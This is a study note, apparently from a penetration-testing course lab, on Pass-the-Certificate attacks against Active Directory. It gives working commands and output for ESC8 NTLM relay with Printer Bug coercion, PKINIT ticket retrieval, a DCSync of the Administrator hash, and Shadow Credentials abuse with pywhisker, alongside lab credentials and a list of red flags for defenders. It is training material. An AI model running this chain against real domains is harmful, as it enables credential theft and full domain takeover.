# 🪪 Pass the Certificate

> **Module Section:** 23 / 26 — Password Attacks

## Overview

**PKINIT** (Public Key Cryptography for Initial Authentication) is a Kerberos extension enabling **public-key authentication** during the initial AS-REQ exchange. It's typically used for smart-card logons (cert + private key).

**Pass-the-Certificate** = using an **X.509 certificate** to obtain a Kerberos **TGT** via PKINIT.

### Common Use Cases

| Attack | Description |
|--------|-------------|
| **ADCS Attacks** | Especially **ESC8** (NTLM relay to web enrollment) |
| **Shadow Credentials** | Abusing `msDS-KeyCredentialLink` |

> 📖 Full coverage in the **ADCS Attacks** HTB Academy module.

---

## 1️⃣ ESC8 — ADCS NTLM Relay Attack

### Prerequisites

- ADCS configured with **Web Enrollment** (`/CertSrv`)
- Web enrollment over **HTTP** (no EPA)
- A way to coerce machine auth to attacker

### Step 1 — Start ntlmrelayx

```bash
impacket-ntlmrelayx \
    -t http://10.129.234.110/certsrv/certfnsh.asp \
    --adcs \
    -smb2support \
    --template KerberosAuthentication
```

| Flag | Purpose |
|------|---------|
| `-t` | Target CA web enrollment endpoint |
| `--adcs` | Enable ADCS relay mode |
| `-smb2support` | Support SMBv2 |
| `--template` | Certificate template to request (enumerate with Certipy) |

### Step 2 — Coerce Authentication (Printer Bug)

Forces machine account to authenticate back to the attacker. Requires **Print Spooler** running on target.

```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:'package5shores_topher1'@10.129.234.109 10.10.16.12
```

> 💡 Other coercion techniques: **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **Coercer**

### Step 3 — Certificate Issued

`ntlmrelayx` will write a `.pfx` file:
```
[*] Authenticating against http://10.129.234.110 as INLANEFREIGHT/DC01$ SUCCEED
[*] GOT CERTIFICATE! ID 8
[*] Writing PKCS#12 certificate to ./DC01$.pfx
```

### Step 4 — Get TGT with `gettgtpkinit.py` (PKINITtools)

```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv && source .venv/bin/activate
pip3 install -r requirements.txt
```

> ⚠️ **"Error detecting the version of libcrypto"** fix:
> ```bash
> pip3 install -I git+https://github.com/wbond/oscrypto.git
> ```

Get the TGT using the relayed certificate:

```bash
python3 gettgtpkinit.py \
    -cert-pfx ../krbrelayx/DC01\$.pfx \
    -dc-ip 10.129.234.109 \
    'inlanefreight.local/dc01$' \
    /tmp/dc.ccache
```

### Step 5 — DCSync with the Machine Account TGT

```bash
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass \
    -dc-ip 10.129.234.109 \
    -just-dc-user Administrator \
    'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

Result:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:...NTLM...:::
```

**🎯 Domain dominated.**

---

## 2️⃣ Shadow Credentials (`msDS-KeyCredentialLink`)

### Concept

Every AD user has an `msDS-KeyCredentialLink` attribute that stores **public keys** for PKINIT auth. If we have **write access** over another user's `msDS-KeyCredentialLink` (BloodHound edge: **`AddKeyCredentialLink`**), we can:

1. Generate our own cert
2. Inject the public key into the victim's attribute
3. Use our corresponding private key to PKINIT as the victim

### Step 1 — Inject Key with `pywhisker`

```bash
pywhisker --dc-ip 10.129.234.109 \
    -d INLANEFREIGHT.LOCAL \
    -u wwhite -p 'package5shores_topher1' \
    --target jpinkman \
    --action add
```

Output:
```
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
```

| Action | Effect |
|--------|--------|
| `add` | Add a key credential (this attack) |
| `list` | List existing keys on target |
| `remove` | Remove specific key |
| `clear` | Wipe all keys (cleanup) |

### Step 2 — Get Victim's TGT

```bash
python3 gettgtpkinit.py \
    -cert-pfx ../eFUVVTPf.pfx \
    -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' \
    -dc-ip 10.129.234.109 \
    INLANEFREIGHT.LOCAL/jpinkman \
    /tmp/jpinkman.ccache
```

### Step 3 — Use the Ticket

```bash
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
# Default principal: jpinkman@INLANEFREIGHT.LOCAL

evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
# *Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
# inlanefreight\jpinkman
```

> 🧹 **Cleanup:** Run `pywhisker --action clear` (or `remove`) to restore the target's `msDS-KeyCredentialLink` attribute afterward.

---

## 3️⃣ No PKINIT? — Use `PassTheCert`

In some environments, the KDC **doesn't support PKINIT** for certain victims (e.g., missing EKU on domain controllers). In that case, **PKINIT-based TGT requests will fail**.

### Alternative: LDAPS Authentication with Cert

**PassTheCert** authenticates against **LDAPS** using a certificate and enables:

- Changing user passwords
- Granting **DCSync** rights
- Adding users to groups
- Any LDAP-based attack

📖 [PassTheCert blog post](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)

---

## Attack Path Comparison

| Attack | Requirement | Result |
|--------|-------------|--------|
| **ESC8** | ADCS web enrollment + coercion target | Cert + TGT as machine account (often DC) |
| **Shadow Credentials** | Write access to victim's `msDS-KeyCredentialLink` | Cert + TGT as victim user |
| **PassTheCert** | Valid cert + LDAPS available | LDAP-based compromise (no TGT needed) |

---

## Tools at a Glance

| Tool | Purpose |
|------|---------|
| `impacket-ntlmrelayx --adcs` | Relay NTLM auth to ADCS, obtain cert |
| `printerbug.py` / `PetitPotam` / `Coercer` | Coerce machine auth |
| `certipy` | Enumerate/abuse AD CS (templates, ESCs) |
| `PKINITtools / gettgtpkinit.py` | Cert → TGT (PKINIT) |
| `pywhisker` | Manipulate `msDS-KeyCredentialLink` |
| `PassTheCert` | Cert-based LDAPS auth (no PKINIT) |
| `impacket-secretsdump -k` | DCSync with ticket |

---

## Defender Red Flags

- 🚨 **ADCS web enrollment over HTTP** — disable HTTP, require EPA
- 🚨 **Machine accounts requesting certs** from unusual sources
- 🚨 **`msDS-KeyCredentialLink` modifications** — audit event 5136
- 🚨 **PKINIT TGT requests** for machine accounts from non-Windows origins
- 🚨 **Print Spooler enabled on DCs** — should be disabled

---

## Key Takeaways

1. **PKINIT** enables Kerberos auth via public key + certificate (originally for smart cards)
2. **Pass-the-Certificate** = exchange cert for TGT via PKINIT
3. **ESC8** relays NTLM to ADCS web enrollment → obtains cert for victim (often a DC machine account)
4. **Printer Bug / PetitPotam / Coercer** force machine auth to attacker-controlled host
5. `gettgtpkinit.py` (from **PKINITtools**) converts a `.pfx` → TGT (ccache)
6. With a **DC machine account TGT**, perform **DCSync** to dump `krbtgt` and Domain Admin hashes
7. **Shadow Credentials** abuses `msDS-KeyCredentialLink` — needs write access on victim
8. **BloodHound edge `AddKeyCredentialLink`** = the primary indicator for this attack path
9. **`pywhisker`** manipulates key credentials; remember to clean up with `--action clear`
10. When PKINIT is unsupported → **PassTheCert** via LDAPS for DCSync/password changes
11. `KRB5CCNAME` remains the bridge between obtaining and *using* tickets

---

## Exercise

*Add exercise answers here as you complete them*

---

## References

- [Certified Pre-Owned (Harmj0y / Will Schroeder)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [PKINITtools (dirkjanm)](https://github.com/dirkjanm/PKINITtools)
- [pywhisker (ShutdownRepo)](https://github.com/ShutdownRepo/pywhisker)
- [Certipy (ly4k)](https://github.com/ly4k/Certipy)
- [Coercer](https://github.com/p0dalirius/Coercer)
- [PassTheCert blog post](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Impacket](https://github.com/fortra/impacket)
